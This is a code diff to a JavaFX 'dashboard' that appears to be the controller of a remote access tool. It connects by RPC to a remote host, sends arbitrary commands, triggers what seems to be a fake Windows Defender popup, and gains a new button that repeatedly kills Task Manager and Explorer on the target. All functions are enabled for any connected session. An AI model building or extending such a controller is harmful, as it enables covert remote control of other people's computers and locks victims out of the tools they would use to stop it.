@@ -8,7 +8,6 @@ import javafx.scene.control.Button;
 import javafx.scene.control.Label;
 import javafx.scene.control.TextArea;
 import javafx.scene.control.TextField;
-import javafx.scene.control.Tooltip;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
 import javafx.scene.layout.Priority;
@@ -64,15 +63,17 @@ public class DashboradA {
         TextField field1 = addFieldRow(formGrid, 0, "Example1");
         TextField field2 = addFieldRow(formGrid, 1, "Example2");
         TextField field3 = addFieldRow(formGrid, 2, "Example3");
+        TextField field4 = addFieldRow(formGrid, 3, "Example4");
 
         Button button1 = createActionButton("Display Text Test");
         Button button2 = createActionButton("Run Command");
         Button button3 = createActionButton("Display Defender Popup");
+        Button button4 = createActionButton("Kill Taskmanager & Explorer Loop");
 
         //button3.setTooltip(new Tooltip("No permissions to use this function"));
 
-        VBox buttonBox = new VBox(10, button1, button2, button3);
-        buttonBox.setPrefWidth(120);
+        VBox buttonBox = new VBox(10, button1, button2, button3, button4);
+        buttonBox.setPrefWidth(300);
 
         Button clearConsoleButton = new Button("Clear Console");
         clearConsoleButton.setOnAction(evt -> console.clear());
@@ -94,11 +95,11 @@ public class DashboradA {
                 portInt = 9000;
             }
 
-            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, button1, button2, button3);
+            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, button1, button2, button3, button4);
         });
 
         disconnectButton.setOnAction(evt ->
-                disconnect(statusLabel, console, connectButton, disconnectButton, button1, button2, button3)
+                disconnect(statusLabel, console, connectButton, disconnectButton, button1, button2, button3, button4)
         );
 
         quitButton.setOnAction(evt -> shutdownClient());
@@ -108,6 +109,7 @@ public class DashboradA {
         button1.setOnAction(evt -> callServer(statusLabel, console, "insertText", field1.getText()));
         button2.setOnAction(evt -> callServer(statusLabel, console, "runCmdIgnoreErrors", field2.getText()));
         button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", field3.getText()));
+        button4.setOnAction(evt -> callServer(statusLabel, console, "runKillTaskmngrAndExp", field4.getText()));
 
         return root;
     }
@@ -136,7 +138,8 @@ public class DashboradA {
                          Button disconnectButton,
                          Button button1,
                          Button button2,
-                         Button button3) {
+                         Button button3,
+                         Button button4) {
 
         statusLabel.setText("Connecting to " + host + ":" + port + " ...");
         statusLabel.setStyle("-fx-text-fill: #ffb433");
@@ -165,7 +168,7 @@ public class DashboradA {
                     button1.setDisable(false);
                     button2.setDisable(false);
                     button3.setDisable(false);
-                    //button4.setDisable(!isAdmin);
+                    button4.setDisable(false);
                 });
             } catch (Exception e) {
                 rpc = null;
@@ -180,6 +183,7 @@ public class DashboradA {
                     button1.setDisable(true);
                     button2.setDisable(true);
                     button3.setDisable(true);
+                    button4.setDisable(true);
                 });
             }
         });
